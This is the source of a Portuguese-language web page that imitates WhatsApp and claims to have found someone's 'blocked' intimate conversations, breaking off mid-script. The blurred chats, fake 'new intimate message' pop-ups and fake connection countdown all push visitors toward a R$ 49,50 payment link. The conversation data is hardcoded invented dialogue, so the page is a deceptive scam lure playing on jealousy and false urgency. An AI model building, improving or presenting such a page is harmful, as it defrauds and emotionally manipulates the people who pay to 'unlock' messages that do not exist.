<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp - Mensagens Bloqueadas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
    <style>
        :root {
            --whatsapp-green: #075e54;
            --whatsapp-teal: #25d366;
            --whatsapp-white: #ffffff;
            --whatsapp-gray-light: #f0f2f5;
            --whatsapp-gray: #667781;
            --whatsapp-gray-dark: #3b4a54;
            --whatsapp-border: #e9edef;
        }
        
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background-color: #0c1317;
            color: #e9edef;
            overflow: hidden;
            touch-action: manipulation;
        }
        
        /* Layout principal */
        .app-container {
            width: 100%;
            height: 100vh;
            background-color: #0c1317;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        
        /* Telas - conversa e chat */
        .screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            transition: transform 0.3s ease;
            display: flex;
            flex-direction: column;
            background-color: #0c1317;
        }
        
        .screen.hidden {
            transform: translateX(100%);
        }
        
        .screen.active {
            transform: translateX(0);
        }
        
        /* Header estilo WhatsApp */
        .whatsapp-header {
            background-color: #202c33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 100;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            min-height: 60px;
            flex-shrink: 0;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
            flex: 1;
            min-width: 0;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
            color: #aebac1;
            flex-shrink: 0;
        }
        
        .header-title {
            font-size: 16px;
            font-weight: 500;
            color: #e9edef;
            line-height: 1.2;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .header-subtitle {
            font-size: 12px;
            color: #8696a0;
            margin-top: 2px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .back-button {
            background: none;
            border: none;
            color: #aebac1;
            font-size: 20px;
            cursor: pointer;
            padding: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        /* Avatar do usu√°rio */
        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            object-fit: cover;
            flex-shrink: 0;
        }
        
        .blurred-avatar {
            filter: blur(3px);
            opacity: 0.7;
        }
        
        /* Efeitos de blur */
        .blurred-text {
            filter: blur(4px);
            color: transparent;
            text-shadow: 0 0 8px rgba(255,255,255,0.5);
            user-select: none;
            pointer-events: none;
        }
        
        .blurred-name {
            filter: blur(5px);
            color: transparent;
            text-shadow: 0 0 10px rgba(255,255,255,0.6);
            background: linear-gradient(90deg, #8696a0 25%, #aebac1 50%, #8696a0 75%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            background-clip: text;
            user-select: none;
            pointer-events: none;
        }
        
        /* Lista de conversas */
        .conversations-list {
            flex: 1;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            padding-bottom: 160px;
            overscroll-behavior: contain;
        }
        
        /* Item de conversa estilo WhatsApp */
        .conversation-item {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            cursor: pointer;
            transition: background-color 0.2s;
            user-select: none;
            min-height: 72px;
        }
        
        .conversation-item:active {
            background-color: #202c33;
        }
        
        .conversation-avatar {
            position: relative;
            margin-right: 12px;
            flex-shrink: 0;
        }
        
        .avatar-img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            object-fit: cover;
        }
        
        .blurred-avatar-img {
            filter: blur(5px);
            opacity: 0.8;
        }
        
        .online-dot {
            position: absolute;
            bottom: 2px;
            right: 2px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: #31a24c;
            border: 2px solid #0c1317;
        }
        
        .conversation-details {
            flex: 1;
            min-width: 0;
            overflow: hidden;
        }
        
        .conversation-name-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 4px;
            min-width: 0;
        }
        
        .conversation-name {
            font-weight: 500;
            font-size: 16px;
            color: #e9edef;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex: 1;
            min-width: 0;
        }
        
        .conversation-time {
            font-size: 12px;
            color: #8696a0;
            flex-shrink: 0;
            margin-left: 8px;
        }
        
        .conversation-preview {
            font-size: 14px;
            color: #8696a0;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        /* Indicador de digita√ß√£o */
        .typing-indicator {
            display: inline-flex;
            align-items: center;
            gap: 2px;
            color: #25d366;
            font-style: italic;
        }
        
        .typing-dot {
            width: 4px;
            height: 4px;
            background-color: #25d366;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }
        
        .typing-dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .typing-dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        @keyframes typing {
            0%, 60%, 100% { opacity: 0.3; }
            30% { opacity: 1; }
        }
        
        /* Badge de bloqueio */
        .locked-badge {
            background-color: rgba(245, 158, 11, 0.2);
            color: #f59e0b;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
            display: inline-flex;
            align-items: center;
            gap: 3px;
            white-space: nowrap;
            flex-shrink: 0;
        }
        
        /* Promo√ß√£o de pagamento */
        .payment-promo {
            background: linear-gradient(135deg, #075e54, #128c7e);
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 15px;
            text-decoration: none;
            display: block;
            border: none;
            font-family: inherit;
        }
        
        .payment-promo-title {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 5px;
        }
        
        .payment-promo-price {
            font-size: 22px;
            font-weight: 700;
        }
        
        /* √Årea do Chat */
        .chat-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            background-color: #0c1317;
            position: relative;
            overflow: hidden;
        }
        
        .chat-messages {
            flex: 1;
            padding: 20px 16px;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            display: flex;
            flex-direction: column;
            gap: 12px;
            overscroll-behavior: contain;
        }
        
        .chat-date {
            text-align: center;
            color: #8696a0;
            font-size: 12px;
            margin: 10px 0;
        }
        
        .message {
            max-width: 85%;
            padding: 8px 12px;
            border-radius: 7.5px;
            position: relative;
            word-wrap: break-word;
            line-height: 1.4;
        }
        
        .message-incoming {
            background-color: #202c33;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        
        .message-outgoing {
            background-color: #005c4b;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        
        .message-content {
            font-size: 14px;
            margin-bottom: 4px;
        }
        
        .message-time {
            font-size: 11px;
            color: rgba(255,255,255,0.6);
            text-align: right;
            display: block;
        }
        
        .blurred-message {
            filter: blur(8px);
            user-select: none;
            pointer-events: none;
            position: relative;
            overflow: hidden;
        }
        
        .blurred-message::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.3);
        }
        
        /* Bot√£o de desbloqueio */
        .unlock-button-container {
            position: fixed;
            bottom: 0;
            width: 100%;
            padding: 12px 16px;
            background-color: #202c33;
            border-top: 1px solid rgba(255,255,255,0.05);
            z-index: 90;
            box-sizing: border-box;
        }
        
        .unlock-all-button {
            display: block;
            background: linear-gradient(135deg, #f59e0b, #d97706);
            color: white;
            padding: 14px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            text-align: center;
            font-size: 14px;
            border: none;
            width: 100%;
            cursor: pointer;
            font-family: inherit;
            touch-action: manipulation;
        }
        
        /* Timer de conex√£o */
        .connection-timer {
            position: fixed;
            bottom: 75px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 380px;
            background: linear-gradient(135deg, #dc2626, #b91c1c);
            color: white;
            border-radius: 8px;
            padding: 10px 15px;
            text-align: center;
            z-index: 85;
            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
            animation: pulse-red 2s infinite;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        @keyframes pulse-red {
            0% { box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3); }
            50% { box-shadow: 0 4px 20px rgba(220, 38, 38, 0.5); }
            100% { box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3); }
        }
        
        .timer-icon {
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .timer-text {
            font-size: 13px;
            font-weight: 500;
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .timer-countdown {
            font-size: 14px;
            font-weight: 700;
            background: rgba(255, 255, 255, 0.2);
            padding: 2px 8px;
            border-radius: 4px;
            min-width: 60px;
            text-align: center;
            flex-shrink: 0;
        }
        
        /* Bot√£o de desbloquear e manter conex√£o */
        .unlock-connection-button {
            position: fixed;
            bottom: 140px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 380px;
            z-index: 86;
            display: none;
            transition: opacity 0.5s, transform 0.5s;
        }
        
        .unlock-connection-link {
            display: block;
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            padding: 12px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            text-align: center;
            font-size: 14px;
            width: 100%;
            cursor: pointer;
            font-family: inherit;
            touch-action: manipulation;
            border: none;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
            animation: pulse-green 1.5s infinite;
        }
        
        @keyframes pulse-green {
            0% { transform: scale(1); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
            50% { transform: scale(1.02); box-shadow: 0 4px 20px rgba(16, 185, 129, 0.5); }
            100% { transform: scale(1); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
        }
        
        .unlock-connection-link i {
            margin-right: 5px;
        }
        
        /* Quando o tempo est√° acabando */
        .timer-warning .timer-countdown {
            background: rgba(255, 50, 50, 0.3);
            animation: pulse 1s infinite;
        }
        
        /* Scrollbar personalizada */
        ::-webkit-scrollbar {
            width: 4px;
        }
        
        ::-webkit-scrollbar-track {
            background: transparent;
        }
        
        ::-webkit-scrollbar-thumb {
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
        }
        
        /* √çcones */
        .bi {
            font-size: 1.2rem;
        }
        
        /* Status dos grupos */
        .group-icon {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background-color: #075e54;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
        }
        
        .blurred-group-icon {
            filter: blur(4px);
            opacity: 0.7;
        }
        
        /* Se√ß√£o de conversas bloqueadas */
        .section-title {
            font-size: 13px;
            color: #8696a0;
            text-transform: uppercase;
            padding: 12px 16px 6px;
            background-color: #0c1317;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        /* Mensagem de bloqueio no chat */
        .chat-blocked-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(12, 19, 23, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 50;
            padding: 16px;
            text-align: center;
        }
        
        .blocked-content {
            background: rgba(32, 44, 51, 0.95);
            border-radius: 12px;
            padding: 20px;
            width: 100%;
            max-width: 320px;
            border: 1px solid rgba(245, 158, 11, 0.2);
        }
        
        .blocked-icon {
            font-size: 36px;
            color: #f59e0b;
            margin-bottom: 12px;
        }
        
        .blocked-title {
            font-size: 17px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #e9edef;
        }
        
        .blocked-text {
            color: #8696a0;
            font-size: 14px;
            margin-bottom: 16px;
            line-height: 1.4;
        }
        
        /* Pop-up de novas mensagens */
        .popup-notification {
            position: fixed;
            top: 70px;
            left: 50%;
            transform: translateX(-50%) translateY(-100px);
            width: 90%;
            max-width: 380px;
            background: linear-gradient(135deg, #075e54, #128c7e);
            color: white;
            border-radius: 12px;
            padding: 14px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 12px;
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
        }
        
        .popup-notification.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        
        .popup-icon {
            background-color: rgba(255, 255, 255, 0.2);
            width: 38px;
            height: 38px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            flex-shrink: 0;
        }
        
        .popup-content {
            flex: 1;
            min-width: 0;
        }
        
        .popup-title {
            font-weight: 600;
            font-size: 15px;
            margin-bottom: 3px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .popup-message {
            font-size: 13px;
            opacity: 0.9;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .popup-close {
            background: none;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.7;
            flex-shrink: 0;
        }
        
        .popup-badge {
            background-color: #f59e0b;
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: bold;
            margin-left: 5px;
        }
        
        /* Estados selecionados */
        .conversation-item.selected {
            background-color: #202c33;
        }
        
        /* Preven√ß√£o de sele√ß√£o de texto */
        .no-select {
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        /* Anima√ß√µes */
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        
        .pulse-animation {
            animation: pulse 2s infinite;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes fadeOut {
            from { opacity: 1; transform: translateY(0); }
            to { opacity: 0; transform: translateY(10px); }
        }
        
        .fade-out {
            animation: fadeOut 0.5s forwards;
        }
        
        /* Ajustes para telas muito pequenas */
        @media (max-width: 360px) {
            .whatsapp-header {
                padding: 10px 12px;
            }
            
            .conversation-item {
                padding: 10px 12px;
                min-height: 68px;
            }
            
            .avatar-img {
                width: 44px;
                height: 44px;
            }
            
            .group-icon {
                width: 44px;
                height: 44px;
            }
            
            .conversation-name {
                font-size: 15px;
            }
            
            .conversation-preview {
                font-size: 13px;
            }
            
            .payment-promo {
                margin: 12px;
                padding: 12px;
            }
            
            .payment-promo-title {
                font-size: 15px;
            }
            
            .payment-promo-price {
                font-size: 20px;
            }
            
            .unlock-button-container {
                padding: 10px 12px;
            }
            
            .unlock-all-button {
                padding: 12px;
                font-size: 13px;
            }
            
            .popup-notification {
                width: 95%;
                padding: 12px;
            }
            
            .connection-timer {
                padding: 8px 12px;
                bottom: 70px;
            }
            
            .timer-text {
                font-size: 12px;
            }
            
            .timer-countdown {
                font-size: 13px;
                min-width: 55px;
            }
            
            .unlock-connection-button {
                bottom: 125px;
            }
            
            .unlock-connection-link {
                padding: 10px;
                font-size: 13px;
            }
        }
        
        @media (max-height: 600px) {
            .conversations-list {
                padding-bottom: 150px;
            }
            
            .unlock-button-container {
                padding: 10px 16px;
            }
            
            .unlock-all-button {
                padding: 12px;
            }
            
            .conversation-item {
                min-height: 64px;
                padding: 10px 16px;
            }
            
            .avatar-img {
                width: 42px;
                height: 42px;
            }
            
            .connection-timer {
                bottom: 65px;
                padding: 8px 12px;
            }
            
            .unlock-connection-button {
                bottom: 120px;
            }
        }
        
        /* Prevenir zoom em formul√°rios no iOS */
        input, textarea, select {
            font-size: 16px !important;
        }
        
        /* Melhorar √°rea de toque para mobile */
        button, a, .conversation-item {
            min-height: 44px;
        }
        
        /* Ajustar para iPhone X e superiores */
        @supports (padding: max(0px)) {
            .unlock-button-container {
                padding-bottom: max(12px, env(safe-area-inset-bottom));
            }
            
            .whatsapp-header {
                padding-top: max(10px, env(safe-area-inset-top));
                padding-left: max(16px, env(safe-area-inset-left));
                padding-right: max(16px, env(safe-area-inset-right));
            }
            
            .popup-notification {
                top: max(70px, calc(10px + env(safe-area-inset-top)));
            }
            
            .connection-timer {
                bottom: max(75px, calc(75px + env(safe-area-inset-bottom)));
            }
            
            .unlock-connection-button {
                bottom: max(140px, calc(140px + env(safe-area-inset-bottom)));
            }
        }
        
        /* Evitar transbordamento horizontal */
        .conversation-name-row,
        .conversation-preview,
        .header-left {
            overflow: hidden;
        }
        
        /* Melhorar desempenho de rolagem */
        .conversations-list,
        .chat-messages {
            will-change: transform;
            backface-visibility: hidden;
        }
    </style>
</head>
<body class="no-select">
    <!-- Pop-up de notifica√ß√£o -->
    <div class="popup-notification" id="popupNotification">
        <div class="popup-icon">
            <i class="bi bi-shield-lock"></i>
        </div>
        <div class="popup-content">
            <div class="popup-title">
                Novas mensagens encontradas! 
                <span class="popup-badge">+3</span>
            </div>
            <div class="popup-message">
                Conte√∫do √≠ntimo descoberto em conversas bloqueadas
            </div>
        </div>
        <button class="popup-close" id="popupClose">
            <i class="bi bi-x-lg"></i>
        </button>
    </div>
    
    <!-- Timer de conex√£o -->
    <div class="connection-timer" id="connectionTimer">
        <div class="timer-icon">
            <i class="bi bi-wifi-off"></i>
        </div>
        <div class="timer-text">
            Conex√£o inst√°vel ‚Ä¢ Tempo at√© desconectar:
        </div>
        <div class="timer-countdown" id="timerCountdown">05:00</div>
    </div>
    
    <!-- Bot√£o de desbloquear e manter conex√£o -->
    <div class="unlock-connection-button" id="unlockConnectionButton">
        <a href="https://virtualpagamentos.lovable.app/p/4656f87c-dcc4-4b79-b212-1550fb115ac5" class="unlock-connection-link">
            <i class="bi bi-wifi"></i> DESBLOQUEAR E MANTER CONEX√ÉO - R$ 49,50
        </a>
    </div>
    
    <div class="app-container">
        <!-- Tela 1: Lista de Conversas -->
        <div id="conversationsScreen" class="screen active">
            <!-- Header -->
            <div class="whatsapp-header">
                <div class="header-left">
                    <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Perfil" class="user-avatar blurred-avatar">
                    <div style="min-width: 0;">
                        <div class="header-title blurred-name">Conversas</div>
                        <div class="header-subtitle blurred-text">7 conversas bloqueadas</div>
                    </div>
                </div>
                <div class="header-right">
                    <i class="bi bi-camera-video"></i>
                    <i class="bi bi-search"></i>
                    <i class="bi bi-three-dots-vertical"></i>
                </div>
            </div>
            
            <!-- Lista de conversas -->
            <div class="conversations-list">
                <!-- Promo√ß√£o de pagamento -->
                <a href="https://virtualpagamentos.lovable.app/p/4656f87c-dcc4-4b79-b212-1550fb115ac5" class="payment-promo pulse-animation" id="promoLink">
                    <div class="payment-promo-title">üîì LIBERAR ACESSO COMPLETO</div>
                    <div class="payment-promo-price">R$ 49,50 </div>
                </a>
                
                <!-- Se√ß√£o: Conversas Bloqueadas -->
                <div class="section-title">Conversas Bloqueadas</div>
                
                <!-- Conversas individuais -->
                <div class="conversation-item" data-chat="maria">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Maria Silva</span>
                            </div>
                            <div class="conversation-time blurred-text">10:30</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item" data-chat="joao">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot" style="background-color: #8696a0;"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Jo√£o Santos</span>
                            </div>
                            <div class="conversation-time blurred-text">Ontem</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item" data-chat="ana">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Ana Costa</span>
                            </div>
                            <div class="conversation-time blurred-text">Qui</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item" data-chat="pedro">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot" style="background-color: #8696a0;"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Pedro Alves</span>
                            </div>
                            <div class="conversation-time blurred-text">Qua</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item" data-chat="carla">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Carla Dias</span>
                            </div>
                            <div class="conversation-time blurred-text">Ter</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <!-- Se√ß√£o: Grupos Bloqueados -->
                <div class="section-title">Grupos Bloqueados</div>
                
                <!-- Grupos -->
                <div class="conversation-item" data-chat="familia">
                    <div class="conversation-avatar">
                        <div class="group-icon blurred-group-icon">
                            <i class="bi bi-people"></i>
                        </div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Fam√≠lia</span>
                            </div>
                            <div class="conversation-time blurred-text">10:15</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item" data-chat="trabalho">
                    <div class="conversation-avatar">
                        <div class="group-icon blurred-group-icon">
                            <i class="bi bi-people"></i>
                        </div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Trabalho</span>
                            </div>
                            <div class="conversation-time blurred-text">09:45</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do bloqueado</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                    </div>
                </div>
                
                <!-- Conversas adicionais (aparecem depois do pop-up) -->
                <div class="conversation-item new-conversation" data-chat="novamensagem1" style="display: none;">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot" style="background-color: #8696a0;"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Amiga Secreta</span>
                            </div>
                            <div class="conversation-time blurred-text">Agora</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Novo conte√∫do √≠ntimo</span>
                            <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item new-conversation" data-chat="novamensagem2" style="display: none;">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Colega do Trabalho</span>
                            </div>
                            <div class="conversation-time blurred-text">Agora</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Mensagem √≠ntima</span>
                            <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
                        </div>
                    </div>
                </div>
                
                <div class="conversation-item new-conversation" data-chat="novamensagem3" style="display: none;">
                    <div class="conversation-avatar">
                        <img src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="avatar-img blurred-avatar-img">
                        <div class="online-dot" style="background-color: #8696a0;"></div>
                    </div>
                    <div class="conversation-details">
                        <div class="conversation-name-row">
                            <div class="conversation-name">
                                <span class="blurred-name">Ex-namorado(a)</span>
                            </div>
                            <div class="conversation-time blurred-text">Agora</div>
                        </div>
                        <div class="conversation-preview">
                            <span class="blurred-text" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">Conte√∫do sens√≠vel</span>
                            <span class="locked-badge" style="background-color: #dc2626; color: white;">NOVO</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Bot√£o de desbloqueio fixo no rodap√© -->
            <div class="unlock-button-container">
                <a href="https://virtualpagamentos.lovable.app/p/4656f87c-dcc4-4b79-b212-1550fb115ac5" class="unlock-all-button pulse-animation" id="unlockAllButton">
                    <i class="bi bi-unlock-fill"></i> DESBLOQUEAR TODAS AS CONVERSAS - R$ 49,50 
                </a>
            </div>
        </div>
        
        <!-- Tela 2: Visualiza√ß√£o do Chat -->
        <div id="chatScreen" class="screen hidden">
            <!-- Header do Chat -->
            <div class="whatsapp-header">
                <div class="header-left">
                    <button class="back-button" id="backButton">
                        <i class="bi bi-arrow-left"></i>
                    </button>
                    <div class="conversation-avatar">
                        <img id="chatAvatar" src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Contato" class="user-avatar blurred-avatar">
                        <div id="chatOnlineDot" class="online-dot"></div>
                    </div>
                    <div style="min-width: 0;">
                        <div class="header-title">
                            <span id="chatName" class="blurred-name">Maria Silva</span>
                            <span class="locked-badge">üîí</span>
                        </div>
                        <div class="header-subtitle blurred-text" id="chatStatus">Online ‚Ä¢ Hor√°rio bloqueado</div>
                    </div>
                </div>
                <div class="header-right">
                    <i class="bi bi-camera-video"></i>
                    <i class="bi bi-telephone"></i>
                    <i class="bi bi-three-dots-vertical"></i>
                </div>
            </div>
            
            <!-- √Årea de mensagens do chat -->
            <div class="chat-container">
                <div class="chat-messages" id="chatMessages">
                    <!-- Mensagens ser√£o inseridas aqui via JavaScript -->
                </div>
                
                <!-- Overlay de bloqueio -->
                <div class="chat-blocked-overlay">
                    <div class="blocked-content">
                        <div class="blocked-icon">
                            <i class="bi bi-lock-fill"></i>
                        </div>
                        <div class="blocked-title">Conte√∫do Bloqueado üîí</div>
                        <div class="blocked-text">
                            Esta conversa cont√©m mensagens com teor √≠ntimo ou sens√≠vel.
                            <br>
                            <i class="bi bi-clock"></i> Hor√°rio tamb√©m est√° bloqueado
                            <br><br>
                            Desbloqueie todas as conversas para acessar este conte√∫do
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Dados das conversas
        const chatData = {
            maria: {
                name: "Maria Silva",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: true,
                messages: [
                    { type: "incoming", time: "10:15", content: "Oi, tudo bem? Faz tempo que n√£o nos falamos!" },
                    { type: "outgoing", time: "10:16", content: "Tudo sim! E com voc√™? O que tem feito?" },
                    { type: "incoming", time: "10:17", content: "Estou bem tamb√©m! Tenho algo importante para te contar..." },
                    { type: "incoming", time: "10:18", content: "√â sobre aquela noite especial que passamos juntos üòä" },
                    { type: "outgoing", time: "10:20", content: "Ah sim, lembro bem... Foi realmente especial üíñ" },
                    { type: "incoming", time: "10:22", content: "Queria reviver esses momentos com voc√™..." },
                    { type: "outgoing", time: "10:25", content: "Eu tamb√©m! Quando podemos nos encontrar?" }
                ]
            },
            joao: {
                name: "Jo√£o Santos",
                avatar: "https://i.postimg.cc/gcNd6QBM/img1.jpg",
                online: false,
                messages: [
                    { type: "outgoing", time: "14:30", content: "Oi Jo√£o, como voc√™ est√°?" },
                    { type: "incoming", time: "14:35", content: "Estou bem! Precisava conversar com voc√™ sobre algo importante" },
                    { type: "outgoing", time: "14:40", content: "Claro, pode falar" },
                    { type: "incoming", time: "14:45", content: "√â sobre aquela conversa que tivemos naquela noite..." }
                ]
            },
            ana: {
                name: "Ana Costa",
